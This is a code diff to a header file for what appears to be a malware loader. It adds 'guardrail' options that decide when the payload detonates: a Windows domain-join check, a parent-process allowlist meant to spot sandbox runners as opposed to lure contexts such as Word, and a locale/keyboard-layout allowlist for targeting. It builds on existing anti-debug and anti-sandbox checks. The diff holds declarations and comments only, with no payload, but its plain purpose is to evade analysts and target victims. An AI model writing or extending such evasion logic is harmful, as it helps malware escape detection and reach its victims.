@@ -53,6 +53,28 @@ struct GuardrailConfig {
 
     // Anti-sandbox/VM checks
     bool check_sandbox_environment;      // Check for VM/sandbox indicators
+
+    // Domain-join check: only detonate on machines joined to a Windows
+    // domain. Cheap (one NetGetJoinInformation call), highly effective
+    // against standalone sandboxes and analyst workstations that rarely
+    // mirror the target's AD topology.
+    bool check_domain_joined;
+
+    // Parent process allowlist: only detonate when our parent image name
+    // matches one of these (case-insensitive, no path). Catches sandbox
+    // runners that spawn samples from rundll32/cmd/python/analyzer.exe
+    // rather than the expected lure context (explorer, winword, etc.).
+    // Leave allowed_parents=nullptr to skip.
+    const char** allowed_parents;
+    int parent_count_allowed;
+
+    // Locale / keyboard-layout allowlist. Pass a list of Windows LCID
+    // hex strings (e.g. "0409" for en-US, "0411" for ja-JP). If non-null
+    // and non-empty, the loader only detonates when GetUserDefaultLCID()
+    // or any loaded keyboard layout matches one of the entries. Empty
+    // list or nullptr = skip check.
+    const char** allowed_locales;
+    int locale_count_allowed;
 };
 
 /**
@@ -85,6 +107,9 @@ CheckResult CheckDebuggerProcesses();
 CheckResult CheckHardwareBreakpoints();
 CheckResult CheckTimingAnomaly();
 CheckResult CheckSandboxEnvironment();
+CheckResult CheckDomainJoined();
+CheckResult CheckParentProcess(const char** allowed, int allowed_count);
+CheckResult CheckLocale(const char** allowed, int allowed_count);
 
 // Helper functions
 bool CheckIfDebugged();                  // Master anti-debug check (runs all enabled checks)
